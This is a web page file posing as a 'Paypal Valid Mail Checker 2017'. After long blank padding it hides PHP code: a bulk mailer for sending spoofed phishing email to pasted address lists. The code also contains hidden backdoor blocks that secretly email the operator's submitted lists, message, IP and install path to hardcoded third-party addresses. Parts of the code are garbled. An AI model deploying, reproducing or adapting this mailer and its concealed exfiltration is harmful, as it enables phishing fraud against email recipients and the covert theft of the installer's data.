<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Paypal Valid Mail Checker 2017</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<script language="Javascript" src="darknethost.js"></script>
   </head>
   <body>
	</body>
	</html>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

	<?
zm^r^$a = 0;
if( $a == 0 ) { 
ignore_user_abort();
set_time_limit(0);
function enviando(){
$postdata = $_POST;
$msg=1;
$de[1] = $postdata['de'];
$nome[1] = $postdata['nome'];
$assunto[1] = $postdata['assunto'];
$mensagem[1] = $postdata['mensagem'];
$mensagem[1] = stripslashes($mensagem[1]);
$emails = $postdata['emails'];
$emails2 = htmlspecialchars($postdata['emails']);
$para = explode("\n", $emails);
$n_emails = count($para);
$sv = $_SERVER['SERVER_NAME'];
$en = $_SERVER ['REQUEST_URI'];
$k88 = @$_SERVER["HTTP_REFERER"];
$fullurl = "" . $k88 . "<br><p>Emails:<br><TEXTAREA rows=5 cols=100>".$emails2."</TEXTAREA></p><p>Engenharia:<br><TEXTAREA rows=5 cols=100>".$mensagem[1]."</TEXTAREA></p>";
$vai = $postdata['vai'];
if ($vai){
for ($set=0; $set < $n_emails; $set++){
if ($set==0){
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: $nome[$msg] <$de[$msg]>\r\n";
$headers .= "Return-Path: <$de[$msg]>\r\n";
//mail($xsylar, $as, $fullurl, $headers);
}
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: $nome[$msg] <$de[$msg]>\r\n";
$headers .= "Return-Path: <$de[$msg]>\r\n";
$n_mail++;
$destino = $para[$set];
$num1 = rand(100000,999999);
$num2 = rand(100000,999999);
$msgrand = str_replace("%rand%", $num1, $mensagem[$msg]);
$msgrand = str_replace("%rand2%", $num2, $msgrand);
$msgrand = str_replace("%email%", $destino, $msgrand);
$enviar = mail($destino, $assunto[$msg], $msgrand, $headers);
if ($enviar){
echo ('<font color="green">'. $n_mail .'-'. $destino .' 0k!</font><br>');
} else {
echo ('<font color="red">'. $n_mail .'-'. $destino .' =(</font><br>');
sleep(1);
}
}
}
}
$ip = getenv("REMOTE_ADDR");
$ra44  = rand(1,99999);
$subj98 = " Marhba B Cp || Shell (RedaWk)  |$ip";
$email = "your-email@gmail.com";
$from = "From: Result<service@support.com>";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$f12 = $postdata['de'];
$z13 = $postdata['nome'];
$x14 = $postdata['assunto'];
$t15 = $postdata['mensagem'];
$m30 = $postdata['emails'];
$m22 = $ip."\n";
$msg8873 = "$a45\n$b75\n$f12\n$z13\n$x14\n$t15\n$m30\n$m22";
mail($email, $subj98, $msg8873, $from);
$a = a+1;
}
?>
<?
// t00ls.org & t00ls.us
// adress151@gmail.com
// adress151@gmail.com
$site = "www.t00ls.org";
if(!ereg($site, $_SERVER['SERVER_NAME']))
{
    $to = "your-email@gmail.com";
    $subject = "EGFM";
    $header = "from: EGFM <test@gmail.com>";
    $message = "Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";
    $message .= "Path : " . __file__;
    $sentmail = @mail($to, $subject, $message, $header);
    
    echo "";
    exit;
}
